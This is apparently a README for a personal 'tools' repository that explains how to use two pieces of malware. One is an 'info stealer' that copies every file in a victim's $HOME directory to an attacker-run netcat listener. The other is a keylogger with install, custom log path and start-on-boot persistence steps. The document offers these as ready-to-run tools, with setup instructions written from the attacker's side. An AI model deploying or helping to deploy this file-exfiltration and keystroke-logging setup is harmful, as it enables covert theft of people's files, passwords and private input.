# t00l5
learning writing some tools in c++ and python

## Info stealer  

Two hosts, target and attacker.  
In the target host execute the executable of info_stealer.cpp (info_stealer.out), after changing <IP> and <PORT> in the code.  
the IP and PORT should be attacker's. Before executing:  
```
nc -lvp <PORT>
```
On the attacker's machine, and run the code on the target's machine, the attacker machine will receive all the files in $HOME directory, you can play with directory in the cpp code.

## KeyLogger 

`$ make && make install`

It will log to `/var/log/keystroke.log`. This may require root access, but you can change that if you want. Set where you want it to log:

`$ keylogger ~/logfile.txt`

`Logging to: /var/log/keystroke.log`

Want to make it start on system startup?

`$ sudo make startup`

That will run it on startup.

### Uninstall
`$ sudo make uninstall`
Will uninstall the program, but not the logs.

